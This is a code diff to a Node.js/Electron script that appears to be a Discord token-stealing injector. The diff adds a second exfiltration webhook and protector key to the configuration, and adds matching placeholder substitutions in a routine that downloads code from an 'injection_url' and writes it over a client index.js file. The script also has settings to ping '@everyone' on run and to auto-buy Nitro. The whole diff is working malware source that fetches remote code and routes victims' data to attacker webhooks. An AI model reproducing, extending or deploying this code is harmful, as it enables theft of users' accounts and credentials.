@@ -6,8 +6,10 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
+  webhook: '%WEBHOOK%',
+  webhook1: '%WEBHOOK1%',
   webhook_protector_key: '%WEBHOOK_KEY%', 
+  webhook_protector_key1: '%WEBHOOK_KEY1%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
@@ -445,7 +447,9 @@ async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
         res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('%WEBHOOK1%', '${config.webhook1}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
+        res.replace('%WEBHOOK_KEY1%', '${config.webhook_protector_key1}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
